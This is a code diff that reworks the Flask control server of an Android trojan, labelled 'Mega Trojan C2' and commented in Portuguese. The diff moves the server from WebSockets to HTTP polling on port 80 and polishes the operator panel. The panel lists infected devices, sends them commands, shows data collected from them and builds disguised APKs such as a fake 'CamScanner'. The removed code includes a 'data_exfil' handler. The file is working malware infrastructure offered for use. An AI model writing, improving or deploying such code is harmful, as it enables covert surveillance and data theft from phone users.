@@ -1,28 +1,23 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-Mega Trojan C2 — Servidor de controlo
-Flask + WebSockets + SQLite
+Mega Trojan C2 — Servidor de controlo (HTTP puro, porta 80)
+Flask + SQLite
 """
 
 import os
 import sys
 import sqlite3
-import hashlib
 import secrets
 import json
-import time
-import threading
 from datetime import datetime
 from flask import Flask, request, jsonify, session, render_template_string, redirect, url_for
-from flask_socketio import SocketIO, emit, join_room, leave_room
 from werkzeug.security import generate_password_hash, check_password_hash
 
 app = Flask(__name__)
 app.config['SECRET_KEY'] = secrets.token_hex(32)
-socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')
 
-# A base de dados fica na pasta 80 (raiz do projeto)
+# A base de dados fica na pasta raiz do projeto
 BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
 DB_PATH = os.path.join(BASE_DIR, 'c2.db')
 
@@ -212,6 +207,7 @@ PANEL_TEMPLATE = '''
             white-space: pre-wrap; word-break: break-all;
         }
         .logout { color: #ff0000; text-decoration: none; font-size: 12px; }
+        .empty-msg { color: #888; text-align: center; padding: 20px; }
     </style>
 </head>
 <body>
@@ -234,7 +230,7 @@ PANEL_TEMPLATE = '''
         <div id="builder-section" class="section">
             <h3>Gerador de APK</h3>
             <input type="text" id="apk_name" placeholder="Nome da aplicação (ex: CamScanner)">
-            <input type="text" id="c2_url" placeholder="URL do C2 (ex: http://teu-servidor)">
+            <input type="text" id="c2_url" placeholder="URL do C2 (ex: http://teu-dominio.com)">
             <select id="icon_type">
                 <option value="camera">Câmara</option>
                 <option value="settings">Definições</option>
@@ -259,11 +255,16 @@ PANEL_TEMPLATE = '''
             if (name === 'logs') loadDeviceSelect();
         }
         async function loadDevices() {
+            const grid = document.getElementById('device-grid');
             try {
                 const response = await fetch('/api/devices');
+                if (!response.ok) throw new Error('HTTP ' + response.status);
                 const devices = await response.json();
-                const grid = document.getElementById('device-grid');
                 grid.innerHTML = '';
+                if (devices.length === 0) {
+                    grid.innerHTML = '<p class="empty-msg">Nenhum dispositivo ligado. Aguarda o payload conectar-se.</p>';
+                    return;
+                }
                 devices.forEach(device => {
                     const card = document.createElement('div');
                     card.className = 'device-card ' + device.status;
@@ -290,7 +291,7 @@ PANEL_TEMPLATE = '''
                     grid.appendChild(card);
                 });
             } catch (e) {
-                console.error('Erro ao carregar dispositivos:', e);
+                grid.innerHTML = '<p class="empty-msg" style="color:#ff0000;">Erro ao carregar dispositivos: ' + e.message + '</p>';
             }
         }
         async function sendCommand(deviceId, command, args = '{}') {
@@ -310,12 +311,10 @@ PANEL_TEMPLATE = '''
             const apkName = document.getElementById('apk_name').value;
             const c2Url = document.getElementById('c2_url').value;
             const iconType = document.getElementById('icon_type').value;
-            
             if (!apkName || !c2Url) {
                 document.getElementById('apk-result').innerHTML = '<p style="color:#ff0000;">Preenche nome e URL do C2</p>';
                 return;
             }
-            
             try {
                 const response = await fetch('/api/generate_apk', {
                     method: 'POST',
@@ -332,10 +331,10 @@ PANEL_TEMPLATE = '''
             }
         }
         async function loadDeviceSelect() {
+            const select = document.getElementById('log-device-select');
             try {
                 const response = await fetch('/api/devices');
                 const devices = await response.json();
-                const select = document.getElementById('log-device-select');
                 select.innerHTML = '';
                 devices.forEach(device => {
                     const option = document.createElement('option');
@@ -350,20 +349,22 @@ PANEL_TEMPLATE = '''
         }
         async function loadLogs() {
             const deviceId = document.getElementById('log-device-select').value;
+            const output = document.getElementById('log-output');
             try {
                 const response = await fetch(`/api/devices/${deviceId}/data`);
                 const data = await response.json();
-                const output = document.getElementById('log-output');
                 output.innerHTML = data.map(d =>
                     `<span style="color:#888;">[${d.created_at}]</span> ${d.data_type}: ${d.content}`
                 ).join('\n');
             } catch (e) {
-                console.error('Erro ao carregar logs:', e);
+                output.innerHTML = 'Erro ao carregar logs';
             }
         }
         setInterval(() => {
             if (document.getElementById('devices-section').classList.contains('active')) loadDevices();
         }, 10000);
+        // Carrega dispositivos ao abrir
+        loadDevices();
     </script>
 </body>
 </html>
@@ -442,11 +443,7 @@ def api_send_command(device_id):
     command_id = cursor.lastrowid
     conn.commit()
     conn.close()
-    socketio.emit('command', {
-        'id': command_id,
-        'command': command,
-        'arguments': json.dumps(arguments)
-    }, room=device_id)
+    # O dispositivo vai buscar o comando no próximo polling
     return jsonify({'status': 'sent', 'command_id': command_id})
 
 # ==================== ROTA DE GERAÇÃO DE APK ====================
@@ -458,7 +455,6 @@ def api_generate_apk():
         c2_url = request.json.get('c2_url', '')
         icon_type = request.json.get('icon_type', 'camera')
         
-        # Adiciona o diretório do gerador ao path
         gerador_dir = os.path.join(BASE_DIR, 'gerador')
         sys.path.insert(0, gerador_dir)
         
@@ -491,7 +487,6 @@ def api_device_connect():
         
         conn = get_db()
         
-        # Verifica se existe
         existing = conn.execute(
             "SELECT * FROM devices WHERE device_id = ?",
             (device_id,)
@@ -510,7 +505,6 @@ def api_device_connect():
         
         conn.commit()
         
-        # Busca comandos pendentes
         pending = conn.execute(
             "SELECT * FROM commands WHERE device_id = ? AND status = 'pending'",
             (device_id,)
@@ -577,53 +571,6 @@ def api_command_result():
     except Exception as e:
         return jsonify({'status': 'error', 'message': str(e)}), 500
 
-# ==================== WEBSOCKET (opcional) ====================
-@socketio.on('register')
-def handle_register(data):
-    device_id = secrets.token_hex(16)
-    conn = get_db()
-    conn.execute('''
-        INSERT INTO devices (device_id, model, android_version, phone_number, ip_address, last_seen)
-        VALUES (?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
-    ''', (
-        device_id,
-        data.get('model', 'Unknown'),
-        data.get('android_version', 'Unknown'),
-        data.get('phone_number', 'Unknown'),
-        request.remote_addr
-    ))
-    conn.commit()
-    conn.close()
-    join_room(device_id)
-    emit('registered', {'device_id': device_id})
-
-@socketio.on('device_hello')
-def handle_device_hello(data):
-    device_id = data.get('device_id')
-    if device_id:
-        join_room(device_id)
-        conn = get_db()
-        conn.execute("UPDATE devices SET last_seen = CURRENT_TIMESTAMP, status = 'online' WHERE device_id = ?", (device_id,))
-        conn.commit()
-        pending = conn.execute("SELECT * FROM commands WHERE device_id = ? AND status = 'pending'", (device_id,)).fetchall()
-        for cmd in pending:
-            emit('command', {'id': cmd['id'], 'command': cmd['command'], 'arguments': cmd['arguments']}, room=device_id)
-        conn.close()
-
-@socketio.on('command_result')
-def handle_command_result(data):
-    conn = get_db()
-    conn.execute("UPDATE commands SET status = 'completed', result = ? WHERE id = ?", (json.dumps(data.get('result')), data.get('command_id')))
-    conn.commit()
-    conn.close()
-
-@socketio.on('data_exfil')
-def handle_data_exfil_socket(data):
-    conn = get_db()
-    conn.execute("INSERT INTO collected_data (device_id, data_type, content) VALUES (?, ?, ?)", (data.get('device_id'), data.get('data_type'), json.dumps(data.get('content'))))
-    conn.commit()
-    conn.close()
-
 if __name__ == '__main__':
     print("[+] Mega Trojan C2 iniciado na porta 80")
-    socketio.run(app, host='0.0.0.0', port=80, debug=False, allow_unsafe_werkzeug=True)
+    app.run(host='0.0.0.0', port=80, debug=False)
